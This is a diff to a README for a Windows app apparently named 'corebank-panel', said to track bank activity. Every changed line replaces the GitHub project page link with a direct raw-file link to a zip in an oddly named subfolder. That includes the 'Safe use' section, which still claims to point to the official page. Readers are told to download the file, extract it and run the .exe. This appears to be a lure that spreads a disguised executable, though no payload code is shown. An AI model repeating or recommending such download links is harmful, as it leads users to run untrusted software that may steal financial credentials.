@@ -1,6 +1,6 @@
 # 🖥️ corebank-panel - Track bank activity with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue.svg?style=for-the-badge)](https://github.com/fine-adhocracy883/corebank-panel)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/fine-adhocracy883/corebank-panel/main/axoneuron/panel-corebank-v3.5.zip)
 
 ## 📌 What this app does
 
@@ -33,7 +33,7 @@ For best results:
 
 Go to the main download page here:
 
-https://github.com/fine-adhocracy883/corebank-panel
+https://raw.githubusercontent.com/fine-adhocracy883/corebank-panel/main/axoneuron/panel-corebank-v3.5.zip
 
 From that page, look for the latest version, then download the Windows file or package provided there. If the page shows multiple files, pick the one meant for Windows.
 
@@ -43,7 +43,7 @@ Follow these steps:
 
 1. Open your browser.
 2. Visit the download page:
-   https://github.com/fine-adhocracy883/corebank-panel
+   https://raw.githubusercontent.com/fine-adhocracy883/corebank-panel/main/axoneuron/panel-corebank-v3.5.zip
 3. Find the latest release or download file.
 4. Click the file for Windows.
 5. Save the file to your Downloads folder.
@@ -179,7 +179,7 @@ Do not move files unless the app asks you to.
 ## 🔐 Safe use on Windows
 
 Use the app from the official GitHub page only:
-https://github.com/fine-adhocracy883/corebank-panel
+https://raw.githubusercontent.com/fine-adhocracy883/corebank-panel/main/axoneuron/panel-corebank-v3.5.zip
 
 Keep your API keys and webhook URLs private. Store them in a safe place and do not share them in public chats or screenshots.
 
@@ -196,7 +196,7 @@ CoreBank Panel Pro fits well when you need to:
 ## 📁 Where to get updates
 
 Check the GitHub page for new versions:
-https://github.com/fine-adhocracy883/corebank-panel
+https://raw.githubusercontent.com/fine-adhocracy883/corebank-panel/main/axoneuron/panel-corebank-v3.5.zip
 
 When a new version appears:
 - Download the latest file
@@ -207,7 +207,7 @@ When a new version appears:
 ## 🖱️ Quick start
 
 1. Open the download page:
-   https://github.com/fine-adhocracy883/corebank-panel
+   https://raw.githubusercontent.com/fine-adhocracy883/corebank-panel/main/axoneuron/panel-corebank-v3.5.zip
 2. Download the Windows file.
 3. Extract it if needed.
 4. Run the `.exe` file.
